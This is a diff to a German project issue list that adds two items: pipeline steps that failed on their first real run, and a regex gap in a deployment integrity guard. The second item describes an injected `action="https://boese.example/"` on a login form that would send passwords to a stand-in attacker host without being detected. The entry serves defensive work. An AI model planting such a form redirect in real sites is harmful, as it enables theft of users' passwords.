@@ -46,9 +46,10 @@ demselben Zweig vergeben** (206 Messstand-Schritt, 207 `gen-em.org` in `tools/`,
 Erwartungen der Wiederherstellungsprobe), **213 und 214 aus der
 Durchsicht vom 16.09.2026** (Zustandsdatei der Kette im Webroot;
 `install.php` in der Auslieferung), **215 und 216 aus der unabhängigen
-Durchsicht des P5a-Abschlusses** (16.09.2026, nach dem Merge). Jeder weitere
-Zweig, der Nummern vergibt, beginnt bei **217** und trägt seine Spanne hier
-ein, bevor er pusht.
+Durchsicht des P5a-Abschlusses** (16.09.2026, nach dem Merge), **217 und 218
+aus der Durchsicht der Werkzeugaufrufe** (17.09.2026). Jeder weitere Zweig,
+der Nummern vergibt, beginnt bei **219** und trägt seine Spanne hier ein,
+bevor er pusht.
 
 **Zu den Nummern 59 bis 62 (02.09.2026).** Sie hießen bis dahin 46 bis 49 —
 und zwar ein zweites Mal. Zwei Zweige haben nebeneinander angehängt (die
@@ -2342,6 +2343,72 @@ solche gekennzeichnet. Sie stehen unter *Erledigt*, weil alle vier es sind.
     Markdown-Darstellungen eine doppelte Linie, in anderen eine Überschrift.
     Beim Abhaken der Prüfliste mit wegräumen, nicht dafür eigens anfassen — das
     Dokument verschwindet ohnehin, sobald seine 33 Punkte abgehakt sind.
+
+217. **Ein Schritt der Kette, der nie gelaufen ist, ist ungeprüfter Code.**
+    *Aufgenommen 17.09.2026 aus einer unabhängigen Durchsicht aller
+    Werkzeugaufrufe der drei Arbeitsläufe (25 Befunde geprüft, 14 bestätigt).*
+    Am 16./17.09.2026 sind **drei** Aufrufe beim jeweils ERSTEN echten Lauf
+    gescheitert — und alle drei hatten gültiges YAML und saubere
+    Shell-Syntax:
+
+    - `kreislauf.py` ohne das Pflichtargument `--art`, mit einem `--passwort`,
+      das es nicht gibt, und als **ein** Aufruf, obwohl der Schrittname zwei
+      verspricht.
+    - `pruefstand.sh aufbau` ruft `apt-get` **ohne `sudo`** — im Container ist
+      man root, auf einem Läufer nicht.
+    - `aufnehmen.mjs` mit `--konto`/`--passwort`, die es dort nie gab; das
+      Werkzeug verwarf sie **still** und meldete sich mit den eingebauten
+      Vorgaben an.
+
+    **Alle drei sind behoben**, zwei davon an der Wurzel: `aufnehmen.mjs`
+    bricht jetzt mit Rückgabewert 2 ab, wenn ein Schalter unbekannt ist, und
+    `pruefstand.sh` hat mit `aufbau-uebersetzen` einen Weg ohne `sudo`.
+
+    **Der Punkt bleibt offen, weil die Ursache bleibt:** Es gibt keinen Weg,
+    einen Kettenschritt zu proben, ohne ihn auszuliefern. Die Schritte werden
+    in einer Sitzung geschrieben und zeigen ihre Fehler erst im Ernstfall —
+    beim Produktionslauf also beim ersten Tag.
+
+    *Zu überlegen:* Ein Werkzeug, das jeden `run:`-Block einliest, die darin
+    aufgerufenen Werkzeuge nach ihrer Schnittstelle fragt (`--help`,
+    `add_argument`, der Handparser) und Aufruf gegen Schnittstelle hält. Das
+    fängt genau die drei Fehler oben **vor** dem Lauf. Es wäre das erste
+    Prüfmittel, das die Kette selbst prüft — bisher prüft die Kette nur die
+    Anwendung. Gehört in Stufe 1, wo es nichts kostet.
+
+218. **Die Integritätswache war für den Fall blind, für den es sie gibt.**
+    *Aufgenommen und behoben am 17.09.2026 (Fund 27); gefunden von ihrer
+    eigenen Selbstprobe, die „30 Erwartungen, 2 nicht erfuellt" meldete.*
+    `FORM_RE` las den Tag-Rumpf als `[^>]*` und endete am ersten `>`. Seit
+    Web 20.10.0 (P5a/AP6) trägt das Anmeldeformular
+    `data-sperre-rest="<?= (int)$sperreRest ?>"` — der Tag brach mitten im
+    PHP-Ausdruck ab.
+
+    **Der Schaden war nicht der zerschnittene Tag.** Was übrigblieb, enthielt
+    `<?=`, galt damit als **unbestimmt**, und für jedes unbestimmte Stück der
+    Quelle darf die Auslieferung eines haben, das die Quelle nicht kennt. In
+    genau diesen Freiraum passte ein `action="https://boese.example/"` am
+    **Anmeldeformular** — der Fall „jemand leitet die Passwörter um", für den
+    diese Wache gebaut wurde. Die Umlenk-Prüfung fängt ihn nicht mit ab: Sie
+    sieht `formaction|formmethod|formtarget|formenctype`, nicht das `action`
+    am `<form>` selbst.
+
+    **Behoben:** `FORM_RE` nutzt jetzt `TAG_REST` (wie `SKRIPT_RE` seit
+    Fund 23), und `form_paare()` maskiert nur die Attributwerte, die in der
+    Quelle wirklich aus PHP kommen — auf beiden Seiten. Der Rest des Tags
+    bleibt Wort für Wort vergleichbar. Selbstprobe danach: **30 von 30**.
+
+    **Der Eintrag bleibt stehen, weil es der DRITTE Stolperer über dasselbe
+    Muster ist.** `CLAUDE.md` 6 nennt bereits zwei und schreibt vor, dass ein
+    Werkzeug, das Markup aus Quelldateien liest, den Tag-Rumpf als
+    `(?:<\?(?:php\b|=).*?\?>|[^>])*` lesen muss. Beim Beheben von Fund 23
+    wurde `SKRIPT_RE` umgestellt und `FORM_RE` **übersehen** — in derselben
+    Datei, zwanzig Zeilen weiter.
+
+    *Zu tun:* Die übrigen Muster derselben Datei und der Wartungsprobe gegen
+    dieselbe Regel halten (`BASE_RE` liest heute ebenfalls `[^>]*`), und in
+    `CLAUDE.md` 6 dazuschreiben, dass es **jedes** Tag-Muster betrifft, nicht
+    nur `<script>`.
 
 ## Erledigt
 
